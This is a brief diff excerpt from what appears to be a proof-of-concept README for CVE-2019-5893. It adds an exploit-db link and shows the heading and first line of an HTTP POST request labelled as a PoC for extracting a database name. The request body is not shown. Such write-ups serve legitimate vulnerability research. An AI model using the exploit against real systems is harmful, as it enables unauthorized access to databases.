@@ -4,6 +4,8 @@
 ## CVE-2019-5893
 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5893
 
+https://www.exploit-db.com/exploits/46118
+
 # PoC - Get DB name
 ```
 POST /db/utils/query/data.xml HTTP/1.1
